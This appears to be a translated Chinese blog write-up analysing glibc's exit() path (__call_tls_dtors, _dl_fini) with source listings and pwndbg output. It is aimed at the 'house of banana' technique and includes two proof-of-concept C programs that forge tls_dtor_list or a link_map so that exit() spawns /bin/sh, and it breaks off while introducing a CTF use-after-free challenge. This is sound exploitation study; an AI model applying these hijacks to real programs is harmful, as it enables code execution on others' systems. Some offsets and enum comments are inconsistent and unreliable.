# Glibc2.32源码分析之exit部分

阅读量 **243905**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-12-08 16:32:08

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

Green bananas in wholesale fresh market

## 前言

为了深入理解house of banana，决定分析一下源码，水平有限大佬勿喷，有错误的地方望提出指正，共同进步。

## 原理分析

###  调试代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    int main(){
        puts("start...");
        exit(0);
        return 0;
    }//gcc exit_test.c -o exit_test
    

查看exit源码，这里用到了exit_function_list还有exit_function结构体

    
    
    struct exit_function_list
      {
        struct exit_function_list *next;
        size_t idx;
        struct exit_function fns[32];
      };
    struct exit_function
      {
        /* `flavour' should be of type of the `enum' above but since we need
           this element in an atomic operation we have to use `long int'.  */
        long int flavor;
        union
          {
        void (*at) (void);
        struct
          {
            void (*fn) (int status, void *arg);
            void *arg;
          } on;
        struct
          {
            void (*fn) (void *arg, int status);
            void *arg;
            void *dso_handle;
          } cxa;
          } func;
      };
    

我们在这里可以看到源码是直接调用__run_exit_handlers，可以在源码里看到对应的参数类型，同时gdb跟进去调试的时候也可以看到对应参数。

    
    
    void
    exit (int status)
    {
      __run_exit_handlers (status, &__exit_funcs, true);
    }
    libc_hidden_def (exit)//位置在stdlib/exit.c
    

![](https://p4.ssl.qhimg.com/t016910b008116b6ee8.png)

对应源码，我们可以看到，因为`run_dtors`为1，所以函数会先调用`__call_tls_dtors`函数。

    
    
    __run_exit_handlers (int status, struct exit_function_list **listp,
                 bool run_list_atexit, bool run_dtors)
    {
      /* First, call the TLS destructors.  */
    #ifndef SHARED
      if (&__call_tls_dtors != NULL)
    #endif
        if (run_dtors)
          __call_tls_dtors ();
    
     .......
    

### __call_tls_dtors遍历tls_dtor_list调用函数

查看`__call_tls_dtors`源码，同时`gdb`跟进`__call_tls_dtors`。里面有一个`dtor_list`结构体定义的`tls_dtor_list`指针，`__call_tls_dtors`这个函数的作用就是遍历`tls_dtor_list`结构体链表，每次遍历都会用到`tls_dtor_list`里的`func`，将`tls_dtor_list`里的obj作为第一个参数，这里其实也可以进行利用，只要将`tls_dtor_list`覆盖成我们的堆地址，便可以控制调用函数和其参数。

    
    
    struct dtor_list
    {
      dtor_func func;
      void *obj;
      struct link_map *map;
      struct dtor_list *next;
    };
    static __thread struct dtor_list *tls_dtor_list;
    static __thread void *dso_symbol_cache;
    static __thread struct link_map *lm_cache;
    
    
    
    void
    __call_tls_dtors (void)
    {
      while (tls_dtor_list)
        {
          struct dtor_list *cur = tls_dtor_list;
          dtor_func func = cur->func;
    #ifdef PTR_DEMANGLE
          PTR_DEMANGLE (func);
    #endif
          tls_dtor_list = tls_dtor_list->next;
          func (cur->obj);
          /* Ensure that the MAP dereference happens before
         l_tls_dtor_count decrement.  That way, we protect this access from a
         potential DSO unload in _dl_close_worker, which happens when
         l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */
          atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
          free (cur);
        }
    }
    

###  循环处理使用“atexit”和“on_exit”注册的函数。

在大概读了整个流程后，发现整个循环（两层循环）都只执行了一次；因为cur->next==null且cur->idx为1；在第一次`while
(cur->idx > 0)`里有`--cur->idx`的操作，所以循环一次；然后在循环退出的时候；`*listp =
cur->next;.....cur = *listp;`使得在第一次`while (true)`的循环后，第二次循环开始的时候`if (cur ==
NULL){......break}`；退出循环。

    
    
     /* We do it this way to handle recursive calls to exit () made by
         the functions registered with `atexit' and `on_exit'. We call
         everyone on the list and use the status value in the last
         exit (). */
      while (true)
        {
          struct exit_function_list *cur;
    
          __libc_lock_lock (__exit_funcs_lock);
    
        restart:
          cur = *listp;
    
          if (cur == NULL)
        {
          /* Exit processing complete.  We will not allow any more
             atexit/on_exit registrations.  */
          __exit_funcs_done = true;
          __libc_lock_unlock (__exit_funcs_lock);
          break;
        }
    
          while (cur->idx > 0)
        {
              struct exit_function *const f = &cur->fns[--cur->idx];
    .......
         }
            *listp = cur->next;
          if (*listp != NULL)
        /* Don't free the last element in the chain, this is the statically
           allocate element.  */
        free (cur);
          __libc_lock_unlock (__exit_funcs_lock);
       }
    

可以gdb动调看一下

    
    
    pwndbg> p cur
    $1 = (struct exit_function_list *) 0x7ffff7fa2bc0 <initial>
    
    
    
    pwndbg> p *(struct exit_function_list *) 0x7ffff7fa2bc0
    $2 = {
      next = 0x0,
      idx = 1,
      fns = {{
          flavor = 4,
          func = {
            at = 0x21d4735c8b0c67e2,
            on = {
              fn = 0x21d4735c8b0c67e2,
              arg = 0x0
            },
            cxa = {
              fn = 0x21d4735c8b0c67e2,
              arg = 0x0,
              dso_handle = 0x0
            }
          }
        }, {
          flavor = 0,
          func = {
            .......
          }
        } <repeats 31 times>}
    }
    

整个循环源代码如下

    
    
    ......
    while (cur->idx > 0)
        {
          struct exit_function *const f = &cur->fns[--cur->idx];
          const uint64_t new_exitfn_called = __new_exitfn_called;
    
          /* Unlock the list while we call a foreign function.  */
          __libc_lock_unlock (__exit_funcs_lock);
          switch (f->flavor)
            {
              void (*atfct) (void);
              void (*onfct) (int status, void *arg);
              void (*cxafct) (void *arg, int status);
    
            case ef_free:
            case ef_us:
              break;
            case ef_on:
              onfct = f->func.on.fn;
    #ifdef PTR_DEMANGLE
              PTR_DEMANGLE (onfct);
    #endif
              onfct (status, f->func.on.arg);
              break;
            case ef_at:
              atfct = f->func.at;
    #ifdef PTR_DEMANGLE
              PTR_DEMANGLE (atfct);
    #endif
              atfct ();
              break;
            case ef_cxa:
              /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
             we must mark this function as ef_free.  */
              f->flavor = ef_free;
              cxafct = f->func.cxa.fn;
    #ifdef PTR_DEMANGLE
              PTR_DEMANGLE (cxafct);
    #endif
              cxafct (f->func.cxa.arg, status);
              break;
            }
          /* Re-lock again before looking at global state.  */
          __libc_lock_lock (__exit_funcs_lock);
    
          if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
            /* The last exit function, or another thread, has registered
               more exit functions.  Start the loop over.  */
            goto restart;
        }
    ......
    

在循环里定义了一个`exit_function`结构体f，为`exit_function`结构体数组cur->fns里的第一个`exit_function`结构体，而且可以通过gdb调试看到此时的`f->flavor`为4，ef_cxa（在stdlib/exit.h里定义了）为4。根据注释里讲的，为了避免`dlclose/exit`争用两次调用`cxafct`，所以将`exit_function`结构体里的f->flavor置为`ef_free`，即置为0。然后`cxafct`就赋值为`0xb685d3b1e02215a8`（每次程序运行的时候都是不一样的）

    
    
    pwndbg> p *cur
    $6 = {
      next = 0x0,
      idx = 0,
      fns = {{
          flavor = 4,
         .........
        }, {
          flavor = 0,
          func = {
            at = 0x0,
          ..........
          }
        } <repeats 31 times>}
    }
    
    
    
    enum
    {
      ef_free,    /* `ef_free' MUST be zero!  */
      ef_us,    //2
      ef_on,    //3
      ef_at,    //4
      ef_cxa    //5
    };//位置在stdlib/exit.h
    

然后紧接着就是通过`PTR_DEMANGLE`处理`cxafct`，成功解析`_di_fini`函数

    
    
    #  define PTR_DEMANGLE(var)    asm ("ror $2*" LP_SIZE "+1, %0\n"          \
                         "xor %%fs:%c2, %0"                  \
                         : "=r" (var)                  \
                         : "0" (var),                  \
                           "i" (offsetof (tcbhead_t,          \
                                  pointer_guard)))
    # endif
    

![](https://p0.ssl.qhimg.com/t01d5945f948e99fadf.png)

调用前

![](https://p4.ssl.qhimg.com/t0164da4b20c3c8e62d.png)

调用后

![](https://p5.ssl.qhimg.com/t012a55edb0beb6a4eb.png)

可以看到这里的`cxafct`转换成了`_dl_fini`地址，然后就是我们house of banana所用到的函数`_dl_fini`。

    
    
    ....
    cxafct (arg, status);//_dl_fini(0,0);
    ....
    

###  进入_dl_fini函数

然后就是进入这个`_dl_fini`函数，看一下源代码

    
    
    void
    _dl_fini (void)
    {
      /* Lots of fun ahead.  We have to call the destructors for all still
         loaded objects, in all namespaces.  The problem is that the ELF
         specification now demands that dependencies between the modules
         are taken into account.  I.e., the destructor for a module is
         called before the ones for any of its dependencies.
    
         To make things more complicated, we cannot simply use the reverse
         order of the constructors.  Since the user might have loaded objects
         using `dlopen' there are possibly several other modules with its
         dependencies to be taken into account.  Therefore we have to start
         determining the order of the modules once again from the beginning.  */
    
      /* We run the destructors of the main namespaces last.  As for the
         other namespaces, we pick run the destructors in them in reverse
         order of the namespace ID.  */
    #ifdef SHARED
      int do_audit = 0;
     again:
    #endif
      for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
        {
          /* Protect against concurrent loads and unloads.  */
          __rtld_lock_lock_recursive (GL(dl_load_lock));
    
          unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
          /* No need to do anything for empty namespaces or those used for
         auditing DSOs.  */
          if (nloaded == 0
    #ifdef SHARED
          || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit
    #endif
          )
        __rtld_lock_unlock_recursive (GL(dl_load_lock));
          else
        {
          /* Now we can allocate an array to hold all the pointers and
             copy the pointers in.  */
          struct link_map *maps[nloaded];
    
          unsigned int i;
          struct link_map *l;
          assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);
          for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
            /* Do not handle ld.so in secondary namespaces.  */
            if (l == l->l_real)
              {
            assert (i < nloaded);
    
            maps[i] = l;
            l->l_idx = i;
            ++i;
    
            /* Bump l_direct_opencount of all objects so that they
               are not dlclose()ed from underneath us.  */
            ++l->l_direct_opencount;
              }
          assert (ns != LM_ID_BASE || i == nloaded);
          assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
          unsigned int nmaps = i;
    
          /* Now we have to do the sorting.  We can skip looking for the
             binary itself which is at the front of the search list for
             the main namespace.  */
          _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),
                 NULL, true);
          __rtld_lock_unlock_recursive (GL(dl_load_lock));
    
          /* 'maps' now contains the objects in the right order.  Now
             call the destructors.  We have to process this array from
             the front.  */
          for (i = 0; i < nmaps; ++i)
            {
              struct link_map *l = maps[i];
    
              if (l->l_init_called)
            {
              /* Make sure nothing happens if we are called twice.  */
              l->l_init_called = 0;
    
              /* Is there a destructor function?  */
              if (l->l_info[DT_FINI_ARRAY] != NULL
                  || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
                {
                  /* When debugging print a message first.  */
                  if (__builtin_expect (GLRO(dl_debug_mask)
                            & DL_DEBUG_IMPCALLS, 0))
                _dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",
                          DSO_FILENAME (l->l_name),
                          ns);
    
                  /* First see whether an array is given.  */
                  if (l->l_info[DT_FINI_ARRAY] != NULL)
                {
                  ElfW(Addr) *array =
                    (ElfW(Addr) *) (l->l_addr
                            + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
                  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                            / sizeof (ElfW(Addr)));
                  while (i-- > 0)
                    ((fini_t) array[i]) ();
                }
    
                  /* Next try the old-style destructor.  */
                  if (ELF_INITFINI && l->l_info[DT_FINI] != NULL)
                DL_CALL_DT_FINI
                  (l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
                }
    
    #ifdef SHARED
              /* Auditing checkpoint: another object closed.  */
              if (!do_audit && __builtin_expect (GLRO(dl_naudit) > 0, 0))
                {
                  struct audit_ifaces *afct = GLRO(dl_audit);
                  for (unsigned int cnt = 0; cnt < GLRO(dl_naudit); ++cnt)
                {
                  if (afct->objclose != NULL)
                    {
                      struct auditstate *state
                    = link_map_audit_state (l, cnt);
                      /* Return value is ignored.  */
                      (void) afct->objclose (&state->cookie);
                    }
                  afct = afct->next;
                }
                }
    #endif
            }
    
              /* Correct the previous increment.  */
              --l->l_direct_opencount;
            }
        }
        }
    
    #ifdef SHARED
      if (! do_audit && GLRO(dl_naudit) > 0)
        {
          do_audit = 1;
          goto again;
        }
    
      if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_STATISTICS))
        _dl_debug_printf ("\nruntime linker statistics:\n"
                  "           final number of relocations: %lu\n"
                  "final number of relocations from cache: %lu\n",
                  GL(dl_num_relocations),
                  GL(dl_num_cache_relocations));
    #endif
    }
    

可以看一下`GL`的定义和`_rtld_global`、`link_map`大概结构体，

    
    
    #  define GL(name) _rtld_local._##name
    # else
    #  define GL(name) _rtld_global._##name
    
    
    
    struct rtld_global
    {
    #endif
      /* Don't change the order of the following elements.  'dl_loaded'
         must remain the first element.  Forever.  */
    /* Non-shared code has no support for multiple namespaces.  */
    #ifdef SHARED
    # define DL_NNS 16
    #else
    # define DL_NNS 1
    #endif
      EXTERN struct link_namespaces
      {
        /* A pointer to the map for the main map.  */
        struct link_map *_ns_loaded;
        /* Number of object in the _dl_loaded list.  */
        unsigned int _ns_nloaded;
        /* Direct pointer to the searchlist of the main object.  */
        struct r_scope_elem *_ns_main_searchlist;
        unsigned int _ns_global_scope_alloc;
        unsigned int _ns_global_scope_pending_adds;
        /* Once libc.so has been loaded into the namespace, this points to
           its link map.  */
        struct link_map *libc_map;
        /* Search table for unique objects.  */
        struct unique_sym_table
        {
          __rtld_lock_define_recursive (, lock)
          struct unique_sym
          {
        uint32_t hashval;
        const char *name;
        const ElfW(Sym) *sym;
        const struct link_map *map;
          } *entries;
          size_t size;
          size_t n_elements;
          void (*free) (void *);
        } _ns_unique_sym_table;
        /* Keep track of changes to each namespace' list.  */
        struct r_debug _ns_debug;
      } _dl_ns[DL_NNS];
    ......
    
    
    
    struct link_map
      {
        /* These first few members are part of the protocol with the debugger.
           This is the same format used in SVR4.  */
        ElfW(Addr) l_addr;        /* Difference between the address in the ELF
                       file and the addresses in memory.  */
        char *l_name;        /* Absolute file name object was found in.  */
        ElfW(Dyn) *l_ld;        /* Dynamic section of the shared object.  */
        struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
        struct link_map *l_real;
        /* Number of the namespace this link map belongs to.  */
        Lmid_t l_ns;
        struct libname_list *l_libname;
        ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
                  + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    .....
    

此时`nloaded`赋值为`_rtld_global->_dl_ns[0]._ns_nloaded`即4（链表的个数），根据调试代码知道从else命令行开始执行。其实注释里有说明接下来的操作，分配数组来保存指针。

![](https://p5.ssl.qhimg.com/t01f222297f5cd38da2.png)

我们可以通过`link_map`结构体指针l_next指针来看一下有哪些`link_map`结构体是这链表的。

    
    
    pwndbg> p *(struct link_map *)0x7ffff7ffe220
    $6 = {
      l_addr = 93824992231424,
      l_name = 0x7ffff7ffe7c8 "",
      l_ld = 0x555555557dc0,
      l_next = 0x7ffff7ffe7d0,
      l_prev = 0x0,
      l_real = 0x7ffff7ffe220,
    .....
    
    
    
    pwndbg> p *(struct link_map *)0x7ffff7ffe7d0
    $7 = {
      l_addr = 140737353900032,
      l_name = 0x7ffff7fc6371 "linux-vdso.so.1",
      l_ld = 0x7ffff7fc63e0,
      l_next = 0x7ffff7fc0200,
      l_prev = 0x7ffff7ffe220,
      l_real = 0x7ffff7ffe7d0,
    ......
    
    
    
    pwndbg> p *(struct link_map *)0x7ffff7fc0200
    $8 = {
      l_addr = 140737351548928,
      l_name = 0x7ffff7fc01e0 "/lib/x86_64-linux-gnu/libc.so.6",
      l_ld = 0x7ffff7f9fbc0,
      l_next = 0x7ffff7ffda48 <_rtld_global+2568>,
      l_prev = 0x7ffff7ffe7d0,
      l_real = 0x7ffff7fc0200,
    ......
    
    
    
    pwndbg> p *(struct link_map *)0x7ffff7ffda48
    $9 = {
      l_addr = 140737353908224,
      l_name = 0x555555554318 "/lib64/ld-linux-x86-64.so.2",
      l_ld = 0x7ffff7ffce70,
      l_next = 0x0,
      l_prev = 0x7ffff7fc0200,
      l_real = 0x7ffff7ffda48 <_rtld_global+2568>,
    ......
    

直到link_map结构体指针`l_next`为null，一共有4个`link_map`结构体，之后就是遍历链表（源码如下），判断`l`（rtld_global结构体里的link_map结构体指针即_rtld_global._dl_ns._ns_loaded）的link_map结构体地址是否与结构体`l`里的l->l_real相等，相等的话继续遍历，将链表添加到maps里，同时i加一（初始为0）。因为后面有一次断言，这样使得我们每次遍历的时候都要满足`l
== l->l_real`，否则计数器i没有办法与`nloaded`（上面说到的链表长度）相等。还有一种情况就是`ns !=
LM_ID_BASE`进入下一个断言，这里就不细说，道理是一样的。

    
    
          for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
            /* Do not handle ld.so in secondary namespaces.  */
            if (l == l->l_real)
              {
            assert (i < nloaded);
    
            maps[i] = l;
            l->l_idx = i;
            ++i;
    
            /* Bump l_direct_opencount of all objects so that they
               are not dlclose()ed from underneath us.  */
            ++l->l_direct_opencount;
              }
          assert (ns != LM_ID_BASE || i == nloaded);
          assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
    

可以看一下maps数组里的指针

    
    
    pwndbg> p maps
    $1 = 0x7fffffffdd10
    pwndbg> x/8gx 0x7fffffffdd10
    0x7fffffffdd10:    0x00007ffff7ffe220    0x00007ffff7ffe7d0
    0x7fffffffdd20:    0x00007ffff7fc0200    0x00007ffff7ffda48
    0x7fffffffdd30:    0x00007fffffffdd30    0x00007ffff7fa1760
    0x7fffffffdd40:    0x0000000000000009    0x00005555555592a0
    

然后就是nmaps（nmap=4）次循环，之后判断link_map结构体`l`里的`l->l_init_called`是否为1，调试看一下发现为1。

    
    
          for (i = 0; i < nmaps; ++i)
            {
              struct link_map *l = maps[i];
              if (l->l_init_called)
            {
              /* Make sure nothing happens if we are called twice.  */
              l->l_init_called = 0;
           ...................
    
    
    
    pwndbg> p l->l_init_called
    $7 = 1
    

接下来判断link_map结构体`l`里的`l->l_info[DT_FINI_ARRAY] != NULL`。

    
    
    #define    DT_FINI_ARRAY    26        /* Array with addresses of fini fct *///在elf/elf.h里
    
    
    
                 /* First see whether an array is given.  */
                  if (l->l_info[DT_FINI_ARRAY] != NULL)
                {
                  ElfW(Addr) *array =
                    (ElfW(Addr) *) (l->l_addr
                            + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
                  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                            / sizeof (ElfW(Addr)));
                  while (i-- > 0)
                    ((fini_t) array[i]) ();
                }
    

我们可以调试看看这里的值，不为null，执行if条件判断里的指令。

    
    
    pwndbg> p l->l_info[26]
    $8 = (Elf64_Dyn *) 0x555555557e10
    

然后就是可以计算array的值，为`15800+93824992231424=0x555555557DB8`其实就是`fini_array`

    
    
    pwndbg> p *(Elf64_Dyn *) 0x555555557e10
    $9 = {
      d_tag = 26,
      d_un = {
        d_val = 15800,
        d_ptr = 15800
      }
    }
    pwndbg> p *l
    $12 = {
      l_addr = 93824992231424,
      l_name = 0x7ffff7ffe7c8 "",
      l_ld = 0x555555557dc0,
    ......
    

后面的话`_dl_fini`函数进行剩下的三次循环，然后我们就回到`__run_exit_handlers`，因为`cur->idx==0且cur->next==0`。

    
    
    pwndbg> p *cur
    $2 = {
      next = 0x0,
      idx = 0,
      fns = {{
          flavor = 0,
          func = {
            at = 0x2155281939208b75,
            on = {
              fn = 0x2155281939208b75,
              arg = 0x0
            },
            cxa = {
              fn = 0x2155281939208b75,
              arg = 0x0,
              dso_handle = 0x0
            }
          }
        }, {
          flavor = 0,
          func = {
            at = 0x0,
            on = {
              fn = 0x0,
              arg = 0x0
            },
            cxa = {
              fn = 0x0,
              arg = 0x0,
              dso_handle = 0x0
            }
          }
        } <repeats 31 times>}
    }
    

然后跳出循环，之后就调用`_exit (status);`，程序结束。

    
    
      while (true)
        {
        .......
        }
      if (run_list_atexit)
        RUN_HOOK (__libc_atexit, ());
      _exit (status);
    }
    
    
    
    pwndbg> directory /usr/src/glibc/glibc-2.34/elf/
    pwndbg> directory /usr/src/glibc/glibc-2.34/stdlib
    

## 编写测试代码

测试机的环境是`Ubuntu 21.10`，地址随机化关闭

![](https://p5.ssl.qhimg.com/t01f525e969f2341a3f.png)

###  第一部分

####  `__call_tls_dtors`利用思路

可以先看看源代码，还有对应结构体。

    
    
    void
    __call_tls_dtors (void)
    {
      while (tls_dtor_list)
        {
          struct dtor_list *cur = tls_dtor_list;
          dtor_func func = cur->func;
    #ifdef PTR_DEMANGLE
          PTR_DEMANGLE (func);
    #endif
          tls_dtor_list = tls_dtor_list->next;
          func (cur->obj);
          .........
    
    
    
    struct dtor_list
    {
      dtor_func func;
      void *obj;
      struct link_map *map;
      struct dtor_list *next;
    };
    static __thread struct dtor_list *tls_dtor_list;
    

思路确实和简单，伪造`dtor_list`结构体，将结构体地址写入`tls_dtor_list`，使得其不为空，然后调用`func
(cur->obj);`。但是还有一步，就是`PTR_DEMANGLE
(func);`这个操作，这里要讲一下在`linux`里有一种线程局部存储机制，简称`TLS`它主要存储着一个线程的一些全局变量，包括我们熟知的canary也存储在里面，我们可以看看对应结构。

    
    
    typedef struct
    {
      void *tcb;        /* Pointer to the TCB.  Not necessarily the
                   thread descriptor used by libpthread.  */
      dtv_t *dtv;
      void *self;        /* Pointer to the thread descriptor.  */
      int multiple_threads;
      int gscope_flag;
      uintptr_t sysinfo;
      uintptr_t stack_guard;
      uintptr_t pointer_guard;
      unsigned long int unused_vgetcpu_cache[2];
      /* Bit 0: X86_FEATURE_1_IBT.
         Bit 1: X86_FEATURE_1_SHSTK.
       */
      unsigned int feature_1;
      int __glibc_unused1;
      /* Reservation of some values for the TM ABI.  */
      void *__private_tm[4];
      /* GCC split stack support.  */
      void *__private_ss;
      /* The lowest address of shadow stack,  */
      unsigned long long int ssp_base;
      /* Must be kept even if it is no longer used by glibc since programs,
         like AddressSanitizer, depend on the size of tcbhead_t.  */
      __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));
      void *__padding[8];
    } tcbhead_t;//在/sysdeps/x86_64/nptl/tls.h里
    

我们可以gdb调试看看对应的汇编代码

    
    
       0x7ffff7dd1de8 <__GI___call_tls_dtors+40>:    ror    rax,0x11
       0x7ffff7dd1dec <__GI___call_tls_dtors+44>:    xor    rax,QWORD PTR fs:0x30
       0x7ffff7dd1df5 <__GI___call_tls_dtors+53>:    mov    QWORD PTR fs:[rbx],rdx
       0x7ffff7dd1df9 <__GI___call_tls_dtors+57>:    mov    rdi,QWORD PTR [rbp+0x8]
       0x7ffff7dd1dfd <__GI___call_tls_dtors+61>:    call   rax
    

可以看到`PTR_DEMANGLE
(func);`这操作主要是先进行循环右移0x11位，再与fs:0x30（tcbhead_t->pointer_guard）进行异或，最终得到的数据就是我们的函数指针，所以我们只需进行逆操作就可以控制函数地址。

    
    
       system_addr=system_addr^pointer_guard;//system函数地址
       fuke_tls_dtor_list_addr[0]=((system_addr>>(64-0x11))|(system_addr<<0x11));//循环左移0x11
    

####  最终代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    void backdoor() {
       puts("you hacked me!!");
       system("/bin/sh");
    }
    
    int main() {
       puts("let's do it.");
       size_t system_addr = &system;
       size_t libc_base = &puts - 0x84ed0;
       size_t *pointer_guard_addr;
       pointer_guard_addr = libc_base-0x2890;
       size_t pointer_guard = *pointer_guard_addr;
       size_t *tls_dtor_list_addr;
       char *ptr = malloc(0x450);
       size_t *fuke_tls_dtor_list_addr = (size_t *)ptr;//chunk_addr
       tls_dtor_list_addr = libc_base - 0x2918; 
       *tls_dtor_list_addr = fuke_tls_dtor_list_addr;//将chunk地址写入tls_dtor_list指针里（原本为空）
       system_addr=system_addr^pointer_guard;//system函数地址
       fuke_tls_dtor_list_addr[0]=((system_addr>>(64-0x11))|(system_addr<<0x11));//循环左移0x11
       fuke_tls_dtor_list_addr[1]="/bin/sh";
       return 0;
    }
    

###  第二部分

####  `_dl_fini`利用思路

我们的目的是控制`_dl_fini`里的array指针数组并调用它，首先要控制`rtld_global`结构体里的`link_map`结构体指针即`_dl_fini`函数里的`link_map`结构体`l`。

    
    
    void
    _dl_fini (void)
    {
    ..................
                  if (l->l_info[DT_FINI_ARRAY] != NULL)
                {
                  ElfW(Addr) *array =
                    (ElfW(Addr) *) (l->l_addr
                            + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
                  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                            / sizeof (ElfW(Addr)));
                  while (i-- > 0)
                    ((fini_t) array[i]) ();
                }
    ...............
    }
    

首先是伪造`rtld_global`结构体里的`link_map`结构体指针即`rtld_global->_ns_loaded`，为了不破坏`link_map`链表的完整性，因为后面有一次断言判断：检测链表的长度，上面也讲了

    
    
    void
    _dl_fini (void)
    {
    ......
            for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
            /* Do not handle ld.so in secondary namespaces.  */
            if (l == l->l_real)
              {
            assert (i < nloaded);
            maps[i] = l;
            l->l_idx = i;
            ++i;
            /* Bump l_direct_opencount of all objects so that they
               are not dlclose()ed from underneath us.  */
            ++l->l_direct_opencount;
              }
          assert (ns != LM_ID_BASE || i == nloaded);
          assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
    .......
    }
    

所以我们结构体里的`link_map`指针`l_next`要保持不变而且`link_map`结构体`l`里面的`l_real`即`l->l_real`要指向它本身的地址。

    
    
    fuke_rtld_global_ptr_addr[1]=libc_base+0x2767d0;//link_map->l_next
    fuke_rtld_global_ptr_addr[5]=fuke_rtld_global_ptr_addr;//make l == l->l_real
    

然后就是构造并调用我们伪造的函数

    
    
          for (i = 0; i < nmaps; ++i)
            {
              struct link_map *l = maps[i];
              if (l->l_init_called)
            {
              /* Make sure nothing happens if we are called twice.  */
              l->l_init_called = 0;
              /* Is there a destructor function?  */
              if (l->l_info[DT_FINI_ARRAY] != NULL
                  || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
                {
                  .............
                  /* First see whether an array is given.  */
                  if (l->l_info[DT_FINI_ARRAY] != NULL)
                {
                  ElfW(Addr) *array =
                    (ElfW(Addr) *) (l->l_addr
                            + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
                  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                            / sizeof (ElfW(Addr)));
                  while (i-- > 0)
                    ((fini_t) array[i]) ();
                }
     .................
    

然后要使`link_map`结构体`l`里面的`l_init_called`即`l->l_init_called`为1。

    
    
    fuke_rtld_global_ptr_addr[0x63]=0x800000000;//make l->l_init_called==1
    

接下来要使得`l->l_info[DT_FINI_ARRAY] != NULL`即`l->l_info[26] !=
NULL`，我们可以看看array是怎么算的。

    
    
    ElfW(Addr) *array = (ElfW(Addr) *) (l->l_addr+l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
    

可以看看l->l_info[DT_FINI_ARRAY]里的指针对应的结构体

    
    
    typedef struct
    {
      Elf64_Sxword    d_tag;            /* Dynamic entry type */
      union
        {
          Elf64_Xword d_val;        /* Integer value */
          Elf64_Addr d_ptr;            /* Address value */
        } d_un;
    } Elf64_Dyn;//在elf/elf.h里
    

所以我们可以将`l->l_addr`改为堆块的地址（堆块地址指向我们的后门函数地址），然后将`l->l_info[DT_FINI_ARRAY]`里的指针指向对应结构体`Elf64_Dyn`，该结构体我们可以伪造，可以改结构体里的`d_ptr`为固定的值（比如`0x20`或是0）。我们这里伪造为0；然后就是选定一个可读的地址
就好了。

    
    
    fuke_rtld_global_ptr_addr[0x22]=&fuke_rtld_global_ptr_addr[0x40];//l->l_info[26]
    

然后就是满足循环条件，这里我们可以调汇编来看

![](https://p4.ssl.qhimg.com/t01dd456b6cb0a9c5e5.png)

所以我们可以伪造i为1

    
    
      fuke_rtld_global_ptr_addr[0x24]=&fuke_rtld_global_ptr_addr[0x2f];//is in l->l_info[28] ；make i == 1
      fuke_rtld_global_ptr_addr[0x30]=8;//make i == 1
    

最后就是将`l->l_addr`改为堆块的地址（堆块地址指向我们的后门函数地址）

    
    
     fuke_rtld_global_ptr_addr[0] = &fuke_rtld_global_ptr_addr[0x20];//l->l_addr is a pointer of backdoor
     fuke_rtld_global_ptr_addr[0x20] = backdoor;
    

####  最终代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    void backdoor() {
       puts("you hacked me");
       system("/bin/sh");
    }
    
    int main() {
       puts("let's do it.");
       size_t libc_base = &puts - 0x84ed0;
       size_t *_rtld_global_ptr_addr;//
       char *ptr = malloc(0x450);
       _rtld_global_ptr_addr = libc_base + 0x275040;
       size_t *fuke_rtld_global_ptr_addr = (size_t *)ptr;//fuke rtld_global->_ns_loaded
       *_rtld_global_ptr_addr = fuke_rtld_global_ptr_addr;
       fuke_rtld_global_ptr_addr[3]=libc_base+0x2767d0; //link_map->l_next
       fuke_rtld_global_ptr_addr[5]=fuke_rtld_global_ptr_addr;//make l == l->l_real
       fuke_rtld_global_ptr_addr[0x63]=0x800000000;//make l->l_init_called==1
       fuke_rtld_global_ptr_addr[0x22]=&fuke_rtld_global_ptr_addr[0x30];//l->l_info[26]
       fuke_rtld_global_ptr_addr[0x24]=&fuke_rtld_global_ptr_addr[0x2f];//make i == 1
       fuke_rtld_global_ptr_addr[0x30]=8;//make i == 1
       fuke_rtld_global_ptr_addr[0] = &fuke_rtld_global_ptr_addr[0x20];//l->l_addr a pointer of backdoor
       fuke_rtld_global_ptr_addr[0x20] = backdoor;
       return 0;
       }
    

## 实例利用

###  题目分析

魔改的2021湖湘杯2.34的pwn（将原来的_exit改成exit），chunk申请范围是0x40f到0x500，漏洞是uaf

![](https://p2.ssl.qhimg.com/t01f6522f7d2f9cd533.png)

这里地址随机化是开了的

